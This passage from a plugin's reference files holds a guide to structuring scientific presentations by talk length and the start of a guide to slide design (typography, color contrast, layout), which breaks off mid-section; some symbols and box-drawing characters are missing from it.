        "plugins/sys-research/skills/architecting-slides/references/presentation_structure.md": "# Presentation Structure Guide\n\n## Overview\n\nEffective scientific presentations follow a clear narrative structure that guides the audience through your research story. This guide provides structure templates for different talk lengths and contexts, helping you organize content for maximum impact and clarity.\n\n## Core Narrative Structure\n\nAll scientific presentations should follow a story arc that engages, informs, and persuades:\n\n1. **Hook**: Grab attention immediately (30 seconds - 1 minute)\n2. **Context**: Establish the research area and importance (5-10% of talk)\n3. **Problem/Gap**: Identify what's unknown or problematic (5-10% of talk)\n4. **Approach**: Explain your solution or method (15-25% of talk)\n5. **Results**: Present key findings (40-50% of talk)\n6. **Implications**: Discuss meaning and impact (15-20% of talk)\n7. **Closure**: Memorable conclusion and call to action (1-2 minutes)\n\nThis arc mirrors the scientific method while maintaining narrative flow that keeps audiences engaged.\n\n## Slide Count Guidelines\n\n**General Rule**: Approximately 1 slide per minute, with adjustments based on content complexity.\n\n| Talk Duration | Total Slides | Title/Intro | Methods | Results | Discussion | Conclusion |\n|---------------|--------------|-------------|---------|---------|------------|------------|\n| 5 minutes (lightning) | 5-7 | 1-2 | 0-1 | 2-3 | 1 | 1 |\n| 10 minutes (short) | 10-12 | 2 | 1-2 | 4-5 | 2-3 | 1 |\n| 15 minutes (conference) | 15-18 | 2-3 | 2-3 | 6-8 | 3-4 | 1-2 |\n| 20 minutes (extended) | 20-24 | 3 | 3-4 | 8-10 | 4-5 | 2 |\n| 30 minutes (seminar) | 25-30 | 3-4 | 5-6 | 10-12 | 6-8 | 2 |\n| 45 minutes (keynote) | 35-45 | 4-5 | 8-10 | 15-20 | 8-10 | 2-3 |\n| 60 minutes (lecture) | 45-60 | 5-6 | 10-12 | 20-25 | 10-12 | 3-4 |\n\n**Adjustments**:\n- **Complex data**: Reduce slide count (spend more time per slide)\n- **Simple concepts**: Can increase slide count slightly\n- **Heavy animations**: Count as multiple slides if building incrementally\n- **Q&A included**: Reduce content slides by 20-30%\n\n## Structure by Talk Length\n\n### 5-Minute Lightning Talk\n\n**Purpose**: Communicate one key idea quickly and memorably.\n\n**Structure** (5-7 slides):\n1. **Title slide** (15 seconds): Title, name, affiliation\n2. **The Problem** (45 seconds): One compelling problem statement with visual\n3. **Your Solution** (60 seconds): Core approach or finding (1 slide or 2 if showing before/after)\n4. **Key Result** (90 seconds): Single most important finding with clear visualization\n5. **Impact** (45 seconds): Why it matters, one key implication\n6. **Closing** (30 seconds): Memorable takeaway, contact info\n\n**Tips**:\n- Focus on ONE message only\n- Maximize visuals, minimize text\n- Practice exact timing\n- No methods details (mention in one sentence)\n- Prepare for \"tell me more\" conversations after\n\n### 10-Minute Conference Talk\n\n**Purpose**: Present a complete research story with key findings.\n\n**Structure** (10-12 slides):\n1. **Title slide** (30 seconds)\n2. **Hook + Context** (60 seconds): Compelling opening that establishes importance\n3. **Problem Statement** (60 seconds): Knowledge gap or challenge\n4. **Approach Overview** (60-90 seconds): High-level methods (1-2 slides)\n5. **Key Results** (4-5 minutes): Main findings (4-5 slides)\n   - Result 1: Primary finding\n   - Result 2: Supporting evidence\n   - Result 3: Additional validation or application\n   - (Optional) Result 4: Extension or implication\n6. **Interpretation** (90 seconds): What it means (1-2 slides)\n7. **Conclusions** (45 seconds): Main takeaways\n8. **Acknowledgments** (15 seconds): Funding, collaborators\n\n**Tips**:\n- Spend 40-50% of time on results\n- Use build animations to control information flow\n- Practice transitions between sections\n- Leave 2-3 minutes for questions if Q&A is included\n- Have 1-2 backup slides with extra data\n\n### 15-Minute Conference Talk (Standard)\n\n**Purpose**: Comprehensive presentation of a research project with detailed results.\n\n**Structure** (15-18 slides):\n1. **Title slide** (30 seconds)\n2. **Opening Hook** (45 seconds): Attention-grabbing problem or statistic\n3. **Background/Context** (90 seconds): Why this research area matters (1-2 slides)\n4. **Knowledge Gap** (60 seconds): What's unknown or problematic\n5. **Research Question/Hypothesis** (45 seconds): Clear statement of objectives\n6. **Methods Overview** (2-3 minutes): Experimental design (2-3 slides)\n   - Study design/participants\n   - Key procedures or techniques\n   - Analysis approach\n7. **Results** (6-7 minutes): Detailed findings (6-8 slides)\n   - Opening: Sample characteristics or validation\n   - Main finding 1: Primary outcome with statistics\n   - Main finding 2: Secondary outcome or subgroup\n   - Main finding 3: Mechanism or extension\n   - (Optional) Additional analyses or sensitivity tests\n8. **Discussion** (2-3 minutes): Interpretation and context (3-4 slides)\n   - Relationship to prior work\n   - Mechanisms or explanations\n   - Limitations\n   - Implications\n9. **Conclusions** (60 seconds): Key takeaways (1-2 slides)\n10. **Acknowledgments + Questions** (30 seconds)\n\n**Tips**:\n- Budget time for each section and practice with timer\n- Use section dividers or progress indicators\n- Spend most time on results (40-45%)\n- Anticipate likely questions and prepare backup slides\n- Have a \"Plan B\" for running over (know which slides to skip)\n\n### 20-Minute Extended Talk\n\n**Purpose**: In-depth presentation with room for multiple studies or detailed methodology.\n\n**Structure** (20-24 slides):\n\nSimilar to 15-minute talk but with:\n- More detailed methods (3-4 slides with diagrams)\n- Additional result categories or subanalyses\n- More extensive discussion of prior work\n- Deeper dive into one or two key findings\n- More context on limitations and future directions\n\n**Distribution**:\n- Introduction: 3 minutes (3 slides)\n- Methods: 4 minutes (3-4 slides)\n- Results: 9 minutes (8-10 slides)\n- Discussion: 3 minutes (4-5 slides)\n- Conclusion: 1 minute (2 slides)\n\n### 30-Minute Seminar\n\n**Purpose**: Comprehensive research presentation with methodological depth.\n\n**Structure** (25-30 slides):\n1. **Opening** (2-3 minutes): Title, hook, outline (3-4 slides)\n2. **Background** (4-5 minutes): Detailed context and prior work (4-5 slides)\n3. **Research Questions** (1 minute): Clear objectives (1 slide)\n4. **Methods** (5-6 minutes): Detailed methodology (5-6 slides)\n   - Study design with rationale\n   - Participants/materials\n   - Procedures (possibly multiple slides)\n   - Analysis plan\n   - Validation or pilot data\n5. **Results** (10-12 minutes): Comprehensive findings (10-12 slides)\n   - Demographics/baseline\n   - Primary analyses (multiple slides)\n   - Secondary analyses\n   - Subgroup analyses\n   - Sensitivity analyses\n   - Summary visualization\n6. **Discussion** (5-6 minutes): Interpretation and implications (6-8 slides)\n   - Summary of findings\n   - Comparison to literature (multiple references)\n   - Mechanisms\n   - Strengths and limitations (detailed)\n   - Clinical/practical implications\n   - Future directions\n7. **Conclusions** (1-2 minutes): Key messages (2 slides)\n8. **Acknowledgments/Questions** (1 minute)\n\n**Tips**:\n- Include an outline slide showing talk structure\n- Use section headers to maintain orientation\n- Can include animations and builds for complex concepts\n- More detailed methods are expected\n- Address potential objections proactively\n- Leave 5-10 minutes for Q&A\n\n### 45-Minute Keynote or Invited Talk\n\n**Purpose**: Comprehensive overview of a research program or major project with broader context.\n\n**Structure** (35-45 slides):\n1. **Opening** (3-5 minutes): Hook, personal connection, outline (4-5 slides)\n2. **Big Picture** (5-7 minutes): Field overview and importance (5-7 slides)\n3. **Prior Work** (3-5 minutes): Literature review and gaps (4-5 slides)\n4. **Your Research Program** (25-30 minutes):\n   - Study 1: Question, methods, results (8-10 slides)\n   - Transition: What we learned and what remained unknown\n   - Study 2: Question, methods, results (8-10 slides)\n   - (Optional) Study 3: Extensions or applications (5-7 slides)\n5. **Synthesis** (5-7 minutes): What it all means (5-7 slides)\n   - Integrated findings\n   - Theoretical implications\n   - Practical applications\n   - Limitations\n6. **Future Directions** (2-3 minutes): Where the field is going (2-3 slides)\n7. **Conclusions** (2 minutes): Key messages (2 slides)\n8. **Acknowledgments** (1 minute)\n\n**Tips**:\n- Tell a story arc across multiple studies\n- Show evolution of thinking\n- Include more personal elements and humor\n- Can discuss failed experiments or pivots\n- More philosophical and forward-looking\n- Engage audience with rhetorical questions\n- Leave 10-15 minutes for discussion\n\n### 60-Minute Lecture or Tutorial\n\n**Purpose**: Educational presentation teaching a concept, method, or field overview.\n\n**Structure** (45-60 slides):\n1. **Introduction** (5 minutes): Topic importance, learning objectives (5-6 slides)\n2. **Foundations** (10-12 minutes): Essential background (10-12 slides)\n3. **Core Content - Part 1** (15-18 minutes): First major topic (15-20 slides)\n4. **Core Content - Part 2** (15-18 minutes): Second major topic (15-20 slides)\n5. **Applications** (5-7 minutes): Real-world examples (5-7 slides)\n6. **Summary** (3-5 minutes): Key takeaways, resources (3-4 slides)\n7. **Questions/Discussion** (Remaining time)\n\n**Tips**:\n- Include checkpoints: \"Are there questions so far?\"\n- Use examples and analogies liberally\n- Build complexity gradually\n- Include interactive elements if possible\n- Provide resources for further learning\n- Repeat key concepts at transitions\n- Use consistent visual templates for concept types\n\n## Opening Strategies\n\n### The Hook (First 30-60 seconds)\n\nYour opening sets the tone and captures attention. Effective hooks:\n\n**1. Surprising Statistic**\n- \"Every year, X million people experience Y, yet only Z% receive effective treatment.\"\n- Works well for applied research with societal impact\n\n**2. Provocative Question**\n- \"What if I told you that everything we thought about X is wrong?\"\n- Engages audience immediately, creates curiosity\n\n**3. Personal Story**\n- \"Five years ago, I encountered a patient/problem that changed how I think about...\"\n- Humanizes research, creates emotional connection\n\n**4. Visual Puzzle**\n- Start with an intriguing image or data visualization\n- \"Look at this pattern. What could explain it?\"\n\n**5. Contrasting Paradigms**\n- \"The traditional view says X, but new evidence suggests Y.\"\n- Sets up tension and your contribution\n\n**6. Scope and Scale**\n- \"This problem affects X people, costs Y dollars, and has been unsolved for Z years.\"\n- Establishes immediate importance\n\n### Title Slide Essentials\n\nYour title slide should include:\n- **Clear, specific title** (not generic)\n- **Your name and credentials**\n- **Affiliation(s) with logos**\n- **Date and venue** (conference name)\n- **Optional**: QR code to paper, slides, or resources\n- **Optional**: Compelling background image related to research\n\n**Title Crafting**:\n- Be specific: \"Machine Learning Predicts Alzheimer's Risk from Retinal Images\" \n- Not vague: \"Applications of AI in Healthcare\"\n- Include key method and outcome\n- Maximum 15 words\n- Avoid jargon if presenting to broader audience\n\n### Outline Slides\n\nFor talks >20 minutes, include a brief outline slide:\n- Shows 3-5 main sections\n- Provides roadmap for audience\n- Can return to outline as section dividers\n- Keep simple and visual (not just bullet list)\n\nExample outline approach:\n```\n[Icon] Background  [Icon] Methods  [Icon] Results  [Icon] Implications\n```\n\n## Closing Strategies\n\n### Effective Conclusions\n\nThe last 1-2 minutes are most remembered. Strong conclusions:\n\n**1. Key Takeaways Format**\n- 3-5 bullet points summarizing main messages\n- Each should be a complete, memorable sentence\n- Not just \"Results\": make claims\n\n**2. Call-Back Hook**\n- Reference your opening hook or question\n- \"Remember that surprising statistic? Our findings suggest...\"\n- Creates narrative closure\n\n**3. Practical Implications**\n- \"What does this mean for clinicians/researchers/policy?\"\n- Action-oriented takeaways\n- Bridges science to application\n\n**4. Visual Summary**\n- Single powerful figure integrating all findings\n- Conceptual model showing relationships\n- Before/after comparison\n\n**5. Future Outlook**\n- \"These findings open doors to...\"\n- 1-2 specific next steps\n- Inspiration for audience's own work\n\n### Acknowledgments Slide\n\nEssential elements:\n- **Funding sources** (with grant numbers)\n- **Key collaborators** (with photos if space)\n- **Institution/lab** (with logo)\n- **Study participants** (appropriate mention)\n- Keep brief (15-30 seconds max)\n- Optional: Include contact info and QR codes here\n\n### Final Slide\n\nYour final slide stays visible during Q&A. Include:\n- **\"Thank you\" or \"Questions?\"**\n- **Your contact information** (email, Twitter/X)\n- **QR code to paper, preprint, or slides**\n- **Lab website or GitHub**\n- **Key visual from your research** (not just text)\n\nAvoid ending with \"References\" or dense acknowledgmentsthese don't facilitate discussion.\n\n## Transition Techniques\n\nSmooth transitions maintain narrative flow and audience orientation.\n\n### Between Major Sections\n\n**Explicit Transition Slides**:\n- Use consistent visual style (color, icon, position)\n- Single word or short phrase: \"Methods\" \"Results\" \"Implications\"\n- Optional: Return to outline with current section highlighted\n\n**Verbal Transitions**:\n- \"Now that we've established X, let's examine how we studied Y...\"\n- \"With that background, I'll turn to our key findings...\"\n- \"This raises the question: How did we measure this?\"\n\n### Between Related Slides\n\n**Visual Continuity**:\n- Repeat key element (figure, title format) across slides\n- Use consistent color coding\n- Progressive builds of same figure\n\n**Verbal Bridges**:\n- \"Building on this finding...\"\n- \"To test this further...\"\n- \"This pattern was consistent across...\"\n\n### Signposting Language\n\nHelp audience track progress through talk:\n- \"First, I'll show... Second... Finally...\"\n- \"There are three key findings to discuss...\"\n- \"Now, let's turn to the most surprising result...\"\n- \"Coming back to our original question...\"\n\n## Pacing and Timing\n\n### Time Budgeting\n\n**Plan timing for each slide**:\n- Simple title/transition slides: 15-30 seconds\n- Text content slides: 45-90 seconds\n- Complex figures: 2-3 minutes\n- Key results: 2-4 minutes each\n\n**Common Timing Mistakes**:\n- BAD Spending too long on introduction (>15% of talk)\n- BAD Rushing through results (should be 40-50%)\n- BAD Not leaving time for questions\n- BAD Going over time (extremely unprofessional)\n\n### Practice Strategies\n\n**Full Run-Throughs** (Do 3-5 times):\n1. **First run**: Rough timing, identify problem areas\n2. **Second run**: Practice transitions, smooth language\n3. **Third run**: Final timing with backup plans\n4. **Recording**: Video yourself, watch for tics/filler words\n5. **Audience practice**: Present to colleagues for feedback\n\n**Section Practice**:\n- Practice complex result slides multiple times\n- Rehearse opening and closing until flawless\n- Prepare ad-libs for common questions\n\n**Timing Techniques**:\n- Note target time at bottom of key slides\n- Set phone/watch to vibrate at checkpoints\n- Have Plan B: know which slides to skip if running over\n- Practice with live timer visible\n\n### Managing Time During Talk\n\n**If Running Ahead** (rarely a problem):\n- Expand on key points naturally\n- Take questions mid-talk if appropriate\n- Provide more context or examples\n- Slow down slightly (but don't add filler)\n\n**If Running Behind**:\n- Skip backup slides or extra examples (prepare these in advance)\n- Summarize rather than detail on secondary points\n- Never rush through conclusionsskip earlier content instead\n- NEVER say \"I'll go quickly through these\" (just skip them)\n\n**Time Checkpoints**:\n- 25% through talk = 25% through time\n- 50% through talk = 50% through time\n- After results = should have 5-10 minutes left\n- Start conclusions with 2-3 minutes remaining\n\n## Audience Engagement\n\n### Reading the Room\n\n**Visual Cues**:\n- **Engaged**: Leaning forward, nodding, taking notes\n- **Lost**: Confused expressions, checking phones\n- **Bored**: Leaning back, glazed eyes, fidgeting\n\n**Adjustments**:\n- If losing audience: Speed up, add humor, show compelling visual\n- If audience confused: Slow down, ask \"Does this make sense?\", re-explain\n- If highly engaged: Can add more detail, encourage questions\n\n### Interactive Elements\n\nFor seminars and longer talks:\n\n**Rhetorical Questions**:\n- \"Why do you think this pattern occurred?\"\n- \"What would you predict happens next?\"\n- Pauses for thought (don't immediately answer)\n\n**Quick Polls** (if appropriate):\n- \"Raise your hand if you've encountered X...\"\n- \"How many think the result will be A vs. B?\"\n- Brief, not disruptive\n\n**Checkpoint Questions**:\n- \"Before I continue, are there questions about the methods?\"\n- \"Is everyone comfortable with this concept?\"\n- For longer talks or tutorials\n\n### Body Language and Delivery\n\n**Effective Practices**:\n- GOOD Stand to side of screen, facing audience\n- GOOD Use pointer deliberately for specific elements\n- GOOD Make eye contact with different sections of room\n- GOOD Gesture naturally to emphasize points\n- GOOD Vary voice pitch and pace\n- GOOD Pause after important points\n\n**Avoid**:\n- BAD Reading slides verbatim\n- BAD Turning back to audience\n- BAD Standing in front of projection\n- BAD Fidgeting with pointer/objects\n- BAD Pacing repetitively\n- BAD Monotone delivery\n\n## Special Considerations\n\n### Virtual Presentations\n\n**Technical Setup**:\n- Test screen sharing, audio, and video beforehand\n- Use presenter mode if available (see notes)\n- Ensure good lighting and camera angle\n- Minimize background distractions\n\n**Engagement Challenges**:\n- Can't read audience body language as well\n- More explicit engagement needed\n- Use polls, chat, reactions if platform allows\n- Encourage unmuting for questions\n\n**Pacing**:\n- Slightly slower pace (harder to interrupt virtually)\n- More explicit transitions and signposting\n- Build in planned pauses for questions\n- Monitor chat for questions during talk\n\n### Handling Questions\n\n**During Talk**:\n- For short talks: \"Please hold questions until the end\"\n- For seminars: \"Feel free to interrupt with questions\"\n- If interrupted: \"Great question, let me finish this point and come back to it\"\n\n**Q&A Session**:\n- **Listen fully** before answering\n- **Repeat or rephrase** question for whole audience\n- **Answer concisely** (30-90 seconds max)\n- **Be honest** if you don't know: \"That's a great question I don't have data on yet\"\n- **Redirect if off-topic**: \"That's interesting but beyond scope. Happy to discuss after.\"\n- **Have backup slides** with extra data/analyses ready\n\n**Difficult Questions**:\n- **Hostile**: Stay calm, acknowledge concern, stick to data\n- **Confusing**: Ask for clarification: \"Could you rephrase that?\"\n- **Out of scope**: \"I focused on X, but your question about Y is important for future work\"\n\n### Technical Difficulties\n\n**Preparation**:\n- Have backup: PDF on laptop, cloud, and USB drive\n- Test connections and adapters beforehand\n- Know how to reset display if needed\n- Have printout of slides as absolute backup\n\n**During Talk**:\n- Stay calm and professional\n- Fill time with verbal explanation while fixing\n- Skip problem slide if necessary\n- Apologize briefly but don't dwell on it\n\n## Adapting to Different Venues\n\n### Conference Presentation\n\n**Context**:\n- Concurrent sessions, some audience may arrive late\n- Audience has seen many talks that day\n- Strict time limits\n- May be recorded\n\n**Adaptations**:\n- Strong hook to capture attention\n- Clear, focused message (not trying to show everything)\n- Adhere exactly to time limits\n- Compelling visuals (tired audiences need visual interest)\n- Provide URL or QR code for more information\n\n### Department Seminar\n\n**Context**:\n- Familiar audience with domain knowledge\n- More relaxed atmosphere\n- Can go deeper into methods\n- Questions encouraged throughout\n\n**Adaptations**:\n- Can use more technical language\n- Show more methodological details\n- Discuss failed experiments or challenges\n- Engage in back-and-forth discussion\n- Less formal style acceptable\n\n### Thesis Defense\n\n**Context**:\n- Committee has read dissertation\n- Evaluating your mastery of field\n- Formal assessment situation\n- Extended Q&A expected\n\n**Adaptations**:\n- Comprehensive coverage required\n- Show depth of knowledge\n- Address limitations proactively\n- Demonstrate independent thinking\n- More formal, professional tone\n- Prepare extensively for questions\n\n### Grant Pitch or Industry Talk\n\n**Context**:\n- Audience evaluating feasibility and impact\n- Emphasis on applications and outcomes\n- May include non-scientists\n- Shorter attention for technical details\n\n**Adaptations**:\n- Lead with impact and significance\n- Minimal methods details (what, not how)\n- Show preliminary data and proof of concept\n- Emphasize feasibility and timeline\n- Clear, simple language\n- Strong business case or societal benefit\n\n## Summary Checklist\n\nBefore finalizing your presentation structure:\n\n**Overall Structure**:\n- [ ] Clear narrative arc (hook  context  problem  solution  results  impact)\n- [ ] Appropriate slide count for time available (~1 slide/minute)\n- [ ] 40-50% of time allocated to results\n- [ ] Strong opening and closing\n- [ ] Smooth transitions between sections\n\n**Timing**:\n- [ ] Practiced full talk at least 3 times\n- [ ] Timing noted for key sections\n- [ ] Plan B for running over (slides to skip)\n- [ ] Buffer time for questions (if applicable)\n\n**Engagement**:\n- [ ] Opening hook captures attention\n- [ ] Clear signposting throughout\n- [ ] Conclusion provides memorable takeaways\n- [ ] Final slide facilitates discussion\n\n**Technical**:\n- [ ] Slides numbered (for question reference)\n- [ ] Backup slides prepared for anticipated questions\n- [ ] Contact info and QR codes on final slide\n- [ ] Multiple copies of presentation saved\n\n**Practice**:\n- [ ] Comfortable with content (minimal note reliance)\n- [ ] Transitions smooth and natural\n- [ ] Prepared for likely questions\n- [ ] Tested with live audience if possible\n",
        "plugins/sys-research/skills/architecting-slides/references/slide_design_principles.md": "# Slide Design Principles for Scientific Presentations\n\n## Overview\n\nEffective slide design enhances comprehension, maintains audience attention, and ensures your scientific message is communicated clearly. This guide covers visual hierarchy, typography, color theory, layout principles, and accessibility considerations for creating professional scientific presentations.\n\n## Core Design Principles\n\n### 1. Simplicity and Clarity\n\n**The Fundamental Rule**: Each slide should communicate ONE main idea.\n\n**Why It Matters**:\n- Audiences can only process limited information at once\n- Complexity causes cognitive overload\n- Simple slides are remembered; busy slides are forgotten\n\n**Application**:\n- One message per slide\n- Minimal text (audiences read OR listen, not both simultaneously)\n- Clear visual focus\n- Generous white space\n- Avoid cramming multiple concepts onto one slide\n\n**Example Comparison**:\n```\nAVOID: Single slide with:\n- 3 different graphs\n- 8 bullet points\n- 2 tables\n- Dense caption text\n\nPREFER: Three separate slides:\n- Slide 1: First graph with 2-3 key points\n- Slide 2: Second graph with interpretation\n- Slide 3: Summary table with highlighted finding\n```\n\n### 2. Visual Hierarchy\n\nGuide attention to the most important elements through size, color, and position.\n\n**Hierarchy Levels**:\n1. **Primary**: Main message or key data (largest, highest contrast)\n2. **Secondary**: Supporting information (medium size)\n3. **Tertiary**: Details and labels (smaller, lower contrast)\n\n**Techniques**:\n\n**Size**:\n- Title: Largest (36-54pt)\n- Key findings: Large (24-32pt)\n- Supporting text: Medium (18-24pt)\n- Labels and notes: Smallest but legible (14-18pt)\n\n**Color**:\n- High contrast for key elements\n- Accent colors for emphasis\n- Muted colors for background or secondary info\n\n**Position**:\n- Top-left or top-center: Primary content (Western reading pattern)\n- Center: Focal point for key visuals\n- Bottom or sides: Supporting details\n\n**Weight**:\n- Bold for emphasis on key terms\n- Regular weight for body text\n- Light weight for de-emphasized content\n\n### 3. Consistency\n\nMaintain visual consistency throughout the presentation.\n\n**Elements to Keep Consistent**:\n- **Fonts**: Same font family for all slides\n- **Colors**: Defined color palette (3-5 colors)\n- **Layouts**: Similar slides use same structure\n- **Spacing**: Margins and padding uniform\n- **Style**: Figure formats, bullet styles, numbering\n\n**Benefits**:\n- Professional appearance\n- Reduced cognitive load (audiences learn your visual language)\n- Focus on content, not adjusting to new formats\n- Easy to identify information types\n\n**Template Approach**:\n- Create master slide with standard elements\n- Design 3-5 layout variants (title, content, figure, section divider)\n- Apply consistently throughout\n\n## Typography\n\n### Font Selection\n\n**Recommended Font Types**:\n\n**Sans-Serif Fonts** (Highly Recommended):\n- **Arial**: Universal, highly legible\n- **Helvetica**: Clean, professional\n- **Calibri**: Modern default, works well\n- **Gill Sans**: Elegant sans-serif\n- **Futura**: Geometric, modern\n- **Avenir**: Friendly, professional\n\n**Serif Fonts** (Use Sparingly):\n- Generally harder to read on screens\n- Acceptable for titles in some contexts\n- Avoid for body text in presentations\n\n**Avoid**:\n- Script or handwriting fonts (illegible from distance)\n- Decorative fonts (distracting)\n- Condensed fonts (hard to read)\n- Multiple font families (>2 looks unprofessional)\n\n### Font Sizes\n\n**Minimum Readable Sizes**:\n- **Title slide title**: 44-54pt\n- **Section headers**: 36-44pt\n- **Slide titles**: 32-40pt\n- **Body text**: 24-28pt (absolute minimum 18pt)\n- **Figure labels**: 18-24pt\n- **Captions and citations**: 14-16pt (use sparingly)\n\n**The Room Test**:\n- Can text be read from the back of the room?\n- Rule: Body text should be readable at 6 screen height distance\n- When in doubt: go larger\n\n**Size Relationships**:\n```\nTitle: 40pt\n\nSubheading: 28pt\n\nBody text: 24pt\nRegular content for audience\n\nCaption: 16pt\n```\n\n### Text Formatting\n\n**Best Practices**:\n\n**Line Length**:\n- Maximum 50-60 characters per line\n- Break long sentences into multiple lines\n- Use phrases, not full sentences when possible\n\n**Line Spacing**:\n- 1.2-1.5 line height for readability\n- More spacing for dense content\n- Consistent spacing throughout\n\n**Alignment**:\n- **Left-aligned**: Best for body text (natural reading)\n- **Center-aligned**: Titles, short phrases, key messages\n- **Right-aligned**: Rarely used (occasionally for design balance)\n- **Justified**: Avoid (creates awkward spacing)\n\n**Emphasis**:\n- **Bold** for key terms (use sparingly)\n- Color for emphasis (consistent meaning)\n- Size increase for importance\n- Avoid italics (hard to read from distance)\n- Avoid underline (confused with hyperlinks)\n- DO NOT USE ALL CAPS FOR BODY TEXT (READS AS SHOUTING)\n\n### The 66 Rule\n\n**Guideline**: Maximum 6 bullets per slide, maximum 6 words per bullet.\n\n**Rationale**:\n- More text = audience reads instead of listens\n- Bullet points are prompts, not sentences\n- You provide the explanation verbally\n\n**Better Approach**:\n- 3-4 bullets optimal\n- 4-8 words per bullet\n- Use fragments, not complete sentences\n- Consider replacing text with visuals\n\n**Example Transformation**:\n```\nTOO MUCH TEXT:\n Our study examined the relationship between dietary interventions \n  and cardiovascular outcomes in 1,500 participants over 5 years\n We found that participants in the intervention group showed \n  significantly reduced risk compared to controls\n The effect size was larger than previous studies and persisted \n  at long-term follow-up\n\nBETTER:\n 5-year dietary intervention study\n 27% reduced cardiovascular risk\n Largest effect to date\n```\n\n## Color Theory\n\n### Color Palettes for Scientific Presentations\n\n**Purpose-Driven Color Selection**:\n\n**Professional/Academic** (Conservative):\n- Navy blue (#1C3D5A), gray (#4A5568), white (#FFFFFF)\n- Accent: Orange (#E67E22) or green (#27AE60)\n- Use: Faculty seminars, grant presentations, institutional talks\n\n**Modern/Engaging** (Energetic):\n- Teal (#0A9396), coral (#EE6C4D), cream (#F4F1DE)\n- Accent: Burgundy (#780000)\n- Use: Conference talks, public engagement, TED-style talks\n\n**High Contrast** (Maximum Legibility):\n- Black text (#000000) on white (#FFFFFF)\n- Dark blue (#003366) on white\n- White on dark gray (#2D3748)\n- Use: Large venues, virtual presentations, accessibility priority\n\n**Data Visualization** (Color-blind Safe):\n- Blue (#0173B2), orange (#DE8F05), green (#029E73), red (#CC78BC)\n- Based on Wong/IBM palettes\n- Use: Figures with categorical data, bar charts, line plots\n\n### Color Psychology in Science\n\n**Blue**:\n- Associations: Trust, stability, professionalism, intelligence\n- Use: Backgrounds, institutional presentations, technology topics\n- Caution: Can feel cold; balance with warmer accents\n\n**Green**:\n- Associations: Growth, health, nature, sustainability\n- Use: Biology, environmental science, health outcomes\n- Caution: Avoid red-green combinations (color blindness)\n\n**Red/Orange**:\n- Associations: Energy, urgency, warning, importance\n- Use: Highlighting critical findings, emphasis, calls to action\n- Caution: Don't overuse; loses impact\n\n**Purple**:\n- Associations: Innovation, creativity, wisdom\n- Use: Neuroscience, novel methods, creative research\n- Caution: Can appear less serious in some contexts\n\n**Gray**:\n- Associations: Neutrality, professionalism, sophistication\n- Use: Backgrounds, de-emphasized content, grounding\n- Caution: Can feel dull if overused\n\n### Color Contrast and Accessibility\n\n**WCAG Standards** (Web Content Accessibility Guidelines):\n- **Level AA**: 4.5:1 contrast ratio for normal text\n- **Level AAA**: 7:1 contrast ratio (preferred for presentations)\n\n**High Contrast Combinations**:\n- Black on white (21:1)\n- Dark blue (#003366) on white (12.6:1)\n- White on dark gray (#2D3748) (11.8:1)\n- Dark text (#333333) on cream (#F4F1DE) (9.7:1)\n\n**Low Contrast Combinations** (Avoid):\n- Light gray on white\n- Yellow on white\n- Pastel colors on white backgrounds\n- Red on black (difficult to read)\n\n**Testing Contrast**:\n- Use online tools (e.g., WebAIM Contrast Checker)\n- Print slide in grayscale (should remain legible)\n- View from distance (simulate audience perspective)\n\n### Color Blindness Considerations\n\n**Prevalence**: ~8% of men, ~0.5% of women have color vision deficiency\n\n**Most Common**: Red-green color blindness (protanopia/deuteranopia)\n\n**Safe Practices**:\n- Use blue/orange instead of red/green\n- Add patterns or shapes in addition to color\n- Use color AND other differentiators (shape, size, position)\n- Test with color blindness simulator\n\n**Color-Blind Safe Palettes**:\n```\nPrimary: Blue (#0173B2)\nContrast: Orange (#DE8F05)  [NOT green]\nAdditional: Magenta (#CC78BC), Teal (#029E73)\n```\n\n**Figure Design**:\n- Don't rely solely on red vs. green lines\n- Use different line styles (solid, dashed, dotted)\n- Use symbols (circle, square, triangle) for scatter plots\n- Label directly on plot rather than color legend only\n\n## Layout and Composition\n\n### The Rule of Thirds\n\nDivide slide into 33 grid; place key elements at intersections or along lines.\n\n**Application**:\n```\n+-------+-------+-------+\n|      |      |      |\n|------|------|------|   Key focal points ()\n|      |      |      |\n|------|------|------|\n|      |      |      |\n|------|------|------|\n|      |      |      |\n+-------+-------+-------+\n```\n\n**Benefits**:\n- More visually interesting than centered layouts\n- Natural eye flow\n- Professional appearance\n- Guides attention strategically\n\n**Example Usage**:\n- Place key figure at right third\n- Text summary on left two-thirds\n- Title at top third line\n- Logo at bottom-right intersection\n\n### White Space\n\n**Definition**: Empty space around and between elements.\n\n**Purpose**:\n- Gives content room to \"breathe\"\n- Increases focus on important elements\n- Prevents overwhelming the audience\n- Projects professionalism and confidence\n\n**Guidelines**:\n- Margins: Minimum 5-10% of slide on all sides\n- Element spacing: Clear separation between unrelated items\n- Text padding: Space around text blocks\n- Don't fill every pixel: Empty space is valuable\n\n**Common Mistakes**:\n- Cramming too much on one slide\n- Extending content to edges\n- No space between elements\n- Fear of \"wasting\" space\n\n### Layout Patterns\n\n**Title + Content**:\n```\n\n Slide Title             \n\n                         \n    Content Area         \n    (text, figure,       \n     or combination)     \n                         \n\n```\nUse: Standard slide type, most common\n\n**Two Column**:\n```\n\n Slide Title             \n\n                        \n  Text        Figure    \n  Column      Column    \n                        \n\n```\nUse: Comparing items, text + figure\n\n**Full-Slide Figure**:\n```\n\n                         \n                         \n    Large Figure or      \n    Image                \n                         \n                         \n\n```\nUse: Key results, impactful visuals\n\n**Text Overlay**:\n```\n\n          \n    Text Box           \n          \n     Background Image    \n                         \n\n```\nUse: Title slide, section dividers\n\n**Grid Layout**:\n```\n\n Title                   \n\n Item 1   Item 2 Item 3\n\n Item 4   Item 5 Item 6\n\n```\nUse: Multiple related items, comparisons\n\n### Alignment\n\n**Principle**: Align elements to create visual order and relationships.\n\n**Types**:\n\n**Edge Alignment**:\n- Align left edges of text blocks\n- Align right edges of figures\n- Align top edges of items in row\n\n**Center Alignment**:\n- Center title on slide\n- Center key messages\n- Center lone figures\n\n**Grid Alignment**:\n- Use invisible grid\n- Snap elements to grid lines\n- Maintains consistency across slides\n\n**Visual Impact**:\n- Aligned elements look intentional and professional\n- Misaligned elements appear careless\n- Small misalignments are very noticeable\n\n## Background Design\n\n### Background Colors\n\n**Best Practices**:\n\n**Light Backgrounds** (Most Common):\n- White or off-white (#FFFFFF, #F8F9FA)\n- Very light gray (#F5F5F5)\n- Cream/beige (#FAF8F3)\n\n**Advantages**:\n- Maximum contrast for dark text\n- Works in any lighting\n- Professional and clean\n- Easier on projectors\n\n**Dark Backgrounds**:\n- Dark gray (#2D3748)\n- Navy blue 